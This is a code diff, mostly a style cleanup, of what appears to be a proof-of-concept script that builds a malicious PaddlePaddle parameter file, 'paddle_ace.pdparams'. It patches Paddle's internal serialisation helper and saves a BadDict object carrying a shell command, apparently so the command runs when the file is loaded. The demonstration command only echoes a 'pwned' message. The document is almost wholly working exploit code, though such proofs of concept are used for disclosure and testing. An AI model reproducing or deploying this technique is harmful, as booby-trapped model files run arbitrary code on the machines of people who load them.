@@ -1,7 +1,8 @@
 import paddle
-import numpy as np
-from collections import Iterable, OrderedDict
-    
+
+from collections import OrderedDict
+
+
 def _parse_every_object(obj, condition_func, convert_func):
     if condition_func(obj):
         return convert_func(obj)
@@ -14,21 +15,19 @@ def _parse_every_object(obj, condition_func, convert_func):
             if condition_func(obj[key]):
                 obj[key] = convert_func(obj[key])
             else:
-                obj[key] = _parse_every_object(
-                    obj[key], condition_func, convert_func
-                )
+                obj[key] = _parse_every_object(obj[key], condition_func, convert_func)
         return obj
     elif isinstance(obj, tuple):
-        return tuple(
-            _parse_every_object(list(obj), condition_func, convert_func)
-        )
+        return tuple(_parse_every_object(list(obj), condition_func, convert_func))
     elif isinstance(obj, set):
         object(list(obj), condition_func, convert_func)
     else:
         return obj
-    
+
+
 # hack _parse_every_object method
 paddle.framework.io._parse_every_object = _parse_every_object
+
 
 class BadDict(dict):
     def __init__(self, src: str, **kwargs):
@@ -44,10 +43,13 @@ class BadDict(dict):
             iter(self.items()),
         )
 
+
 paddle.save(
-    [BadDict(
-        'echo "pwned your computer, I can do anything I want."',
-        **{"weight": paddle.zeros((2, 2))},
-    )],
-    "paddle_ace.pdparams", 
+    [
+        BadDict(
+            'echo "pwned your computer, I can do anything I want."',
+            **{"weight": paddle.zeros((2, 2))},
+        )
+    ],
+    "paddle_ace.pdparams",
 )
